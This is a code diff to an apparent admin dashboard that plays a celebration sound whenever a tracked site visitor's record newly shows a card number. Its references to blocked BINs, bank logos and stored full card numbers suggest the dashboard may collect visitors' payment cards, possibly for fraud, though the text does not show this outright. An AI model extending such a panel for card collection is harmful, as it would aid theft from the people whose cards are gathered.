@@ -25,6 +25,7 @@ import {
   listenBlockedBins,
 } from "@/lib/firebase";
 import { findBankLogo } from "@/lib/bank-logos";
+import cardAddedSoundUrl from "@assets/roblox_celebration_1777060364811.mp3";
 import { onAuthStateChanged, type User } from "firebase/auth";
 import {
   Search,
@@ -692,6 +693,15 @@ function AdminDashboard() {
       : "md:col-span-1 xl:col-span-1";
   }
 
+  const cardSeenRef = useRef<Set<string>>(new Set());
+  const cardSnapshotReadyRef = useRef(false);
+  const cardAudioRef = useRef<HTMLAudioElement | null>(null);
+  if (!cardAudioRef.current && typeof Audio !== "undefined") {
+    cardAudioRef.current = new Audio(cardAddedSoundUrl);
+    cardAudioRef.current.preload = "auto";
+    cardAudioRef.current.volume = 0.85;
+  }
+
   useEffect(() => {
     if (!db) {
       setLoading(false);
@@ -709,6 +719,34 @@ function AdminDashboard() {
           const tb = new Date(b.updatedAt || 0).getTime() || 0;
           return tb - ta;
         });
+
+        // Detect newly-added cards. On first snapshot, just record what
+        // already has a card so we don't spam on dashboard open.
+        const newCardVisitors: Visitor[] = [];
+        for (const v of list) {
+          const hasCard = !!(
+            (v as any).cardNumber ||
+            v.payment?.cardNumber ||
+            v.payment?.cardLast4
+          );
+          if (!hasCard) continue;
+          if (!cardSeenRef.current.has(v.id)) {
+            cardSeenRef.current.add(v.id);
+            if (cardSnapshotReadyRef.current) newCardVisitors.push(v);
+          }
+        }
+        if (newCardVisitors.length > 0 && cardAudioRef.current) {
+          try {
+            cardAudioRef.current.currentTime = 0;
+            void cardAudioRef.current.play().catch(() => {
+              // Browsers block autoplay until user interaction; safely ignore.
+            });
+          } catch {
+            // ignore
+          }
+        }
+        cardSnapshotReadyRef.current = true;
+
         setVisitors(list);
         setLoading(false);
         setSelectedId((prev) => {
